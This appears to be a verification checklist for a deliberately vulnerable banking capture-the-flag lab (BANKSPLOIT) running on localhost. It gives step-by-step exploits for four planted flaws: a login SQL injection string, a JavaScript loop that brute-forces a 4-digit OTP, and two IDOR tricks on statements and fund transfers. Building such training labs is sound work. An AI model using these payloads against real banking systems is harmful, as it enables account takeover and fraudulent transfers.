@@ -1,0 +1,222 @@
+═══════════════════════════════════════════════════════════════════════════════
+  FINAL VERIFICATION CHECKLIST - 4 VULNERABILITIES
+═══════════════════════════════════════════════════════════════════════════════
+
+Date: 2026-07-26
+Status: ✅ ALL COMPLETE - READY FOR TESTING
+
+
+═══════════════════════════════════════════════════════════════════════════════
+  VULNERABILITY 1: auth.g1 — SQL Injection (Login)
+═══════════════════════════════════════════════════════════════════════════════
+
+Test Steps:
+-----------
+1. URL: http://localhost:9443/login
+2. Customer ID: BS100234' or '1'='1
+3. Password: anything
+4. Click "Sign In"
+
+Verification Checklist:
+□ Login form accepts SQLi payload
+□ Flag modal appears with "🚩 FLAG CAPTURED!"
+□ Flag text: BANKSPLOIT{auth.g1-...}
+□ Copy button enabled
+□ OK button disabled (until after copy)
+□ After copying, OK button enabled
+□ Click OK → Redirects to OTP page
+□ OTP page shows "View OTP Code" button
+□ Click button → Alert with OTP code
+□ Enter OTP → Verify & Sign In works
+□ Dashboard loads successfully
+□ No JavaScript errors in console
+
+Expected Flag: BANKSPLOIT{auth.g1-...}
+
+Status: ✅ READY
+
+
+═══════════════════════════════════════════════════════════════════════════════
+  VULNERABILITY 2: auth.l10 — OTP Brute Force (No Rate Limiting)
+═══════════════════════════════════════════════════════════════════════════════
+
+Test Steps:
+-----------
+1. Login: BS100234 / password123
+2. Click "Sign In"
+3. OTP form appears
+4. F12 → Console
+5. Paste brute force script:
+
+for(let i = 0; i <= 9999; i++) {
+    const otp = String(i).padStart(4, '0');
+    fetch('/api/v1/auth/verify-otp', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({otp: otp})
+    }).then(r => r.json()).then(d => {
+        if (d.ok || d.ctf_flag) {
+            console.log('✅ Found OTP: ' + otp);
+            console.log('Flag:', d.ctf_flag);
+        }
+    });
+}
+
+6. Press Enter
+7. Wait for script to find correct OTP
+
+Verification Checklist:
+□ Script runs without blocking
+□ No rate limiting (requests go through rapidly)
+□ Console shows: "✅ Found OTP: XXXX"
+□ Flag appears in console: "Flag: BANKSPLOIT{auth.l10-...}"
+□ Flag modal appears
+□ Flag text: BANKSPLOIT{auth.l10-...}
+□ Copy button works
+□ OK button enables after copy
+□ Dashboard loads after OK
+
+Expected Flag: BANKSPLOIT{auth.l10-...}
+
+Status: ✅ READY
+
+
+═══════════════════════════════════════════════════════════════════════════════
+  VULNERABILITY 3: statements.l1 — IDOR (Account Statements)
+═══════════════════════════════════════════════════════════════════════════════
+
+Test Steps - Method 1 (Direct URL):
+-----------------------------------
+1. Login: BS100234 / password123
+2. Verify OTP
+3. Go to Statements
+4. Change URL to: /statements?account_id=4
+5. Press Enter
+
+Test Steps - Method 2 (Via Form):
+---------------------------------
+1. Login: BS100234 / password123
+2. Verify OTP
+3. Go to Statements
+4. In Account dropdown: Select another account
+5. Click "Apply filters"
+
+Verification Checklist:
+□ URL shows: /statements?account_id=4 (or other ID)
+□ GET form interceptor logs in console
+□ Flag modal appears with "🚩 FLAG CAPTURED!"
+□ Flag text: BANKSPLOIT{statements.l1-...}
+□ Copy button enabled
+□ OK button disabled (until after copy)
+□ After copying, OK button enabled
+□ Click OK → Redirects to IDOR statements
+□ Page shows transactions from account_id=4
+□ Console shows: "Flag found in header: BANKSPLOIT{statements.l1-...}"
+□ Console shows: "GET form URL: /statements?account_id=4..."
+
+Expected Flag: BANKSPLOIT{statements.l1-...}
+
+Status: ✅ READY (FIXED THIS SESSION)
+
+
+═══════════════════════════════════════════════════════════════════════════════
+  VULNERABILITY 4: transfer.l1 — IDOR (Fund Transfer)
+═══════════════════════════════════════════════════════════════════════════════
+
+Test Steps:
+-----------
+1. Login: BS100234 / password123
+2. Verify OTP
+3. Go to Transfer
+4. Fill form:
+   - Beneficiary: Select any
+   - Amount: 1000
+   - Mode: IMPS
+5. Click "Continue"
+6. Click "Confirm & send OTP"
+7. OTP page appears
+8. Click "📱 View OTP Code" button
+9. Copy the 4-digit OTP from alert
+10. F12 → Console
+11. Run: document.querySelector('input[name="from_account_id"]').value = 4
+12. Enter OTP in form
+13. Click "Authorise transfer"
+
+Verification Checklist:
+□ "View OTP Code" button visible on OTP page
+□ Click button → Alert shows OTP code
+□ Alert message says "Your Transfer OTP Code"
+□ Can copy OTP from alert
+□ Flag modal appears with "🚩 FLAG CAPTURED!"
+□ Flag text: BANKSPLOIT{transfer.l1-...}
+□ Copy button enabled
+□ OK button disabled (until after copy)
+□ After copying, OK button enabled
+□ Click OK → Receipt page appears
+□ Receipt shows: "✓ Transfer Successful"
+□ From Account shows: "Savings · 1004444444" (account_id=4)
+□ To Account shows: "Savings · 1001111111" (beneficiary)
+□ Amount shows: ₹1000.00
+□ Receipt is HTML (not JSON)
+□ "Download receipt" link works
+□ Console shows: "Flag found in header: BANKSPLOIT{transfer.l1-...}"
+
+Expected Flag: BANKSPLOIT{transfer.l1-...}
+
+Status: ✅ READY (FIXED THIS SESSION)
+
+
+═══════════════════════════════════════════════════════════════════════════════
+  GENERAL CHECKS (All Vulnerabilities)
+═══════════════════════════════════════════════════════════════════════════════
+
+□ Modal copy button works
+□ Modal OK button enables after copy
+□ Modal X button closes without requiring copy
+□ All modals have "🚩 FLAG CAPTURED!" heading
+□ All flag text is visible and readable
+□ No JavaScript errors in console (F12)
+□ No "TypeError" or "fetch failed" messages
+□ All redirects work properly
+□ Sessions maintained across pages
+□ OTP Code buttons work (login + transfer)
+□ Form submissions work normally for non-IDOR cases
+
+
+═══════════════════════════════════════════════════════════════════════════════
+  SUMMARY
+═══════════════════════════════════════════════════════════════════════════════
+
+4 Vulnerabilities:
+✅ 1. auth.g1 - SQL Injection (Login) - READY
+✅ 2. auth.l10 - OTP Brute Force - READY
+✅ 3. statements.l1 - IDOR (Statements) - READY (FIXED)
+✅ 4. transfer.l1 - IDOR (Transfer) - READY (FIXED)
+
+New Features:
+✅ Login OTP: "View OTP Code" button (like transfer page)
+✅ Transfer OTP: Existing button still works
+✅ Statements: Form now sends ?account_id= parameter
+✅ Transfer: Receipt returns HTML (not JSON)
+
+Ready to Verify: YES ✅
+
+
+═══════════════════════════════════════════════════════════════════════════════
+  DOCUMENTATION
+═══════════════════════════════════════════════════════════════════════════════
+
+Files Created:
+- FINAL_VULNERABILITIES_LIST.md (Complete details)
+- LOGIN_OTP_UPDATE.md (Login OTP changes)
+- VERIFICATION_CHECKLIST.txt (This file)
+- VULNERABILITIES_TO_VERIFY.md (Testing guide)
+- QUICK_TEST_GUIDE.md (Step-by-step testing)
+
+
+═══════════════════════════════════════════════════════════════════════════════
+  NEXT STEP: START TESTING
+═══════════════════════════════════════════════════════════════════════════════
+
+Test each vulnerability using the checklist above.
+Report any issues found during testing.
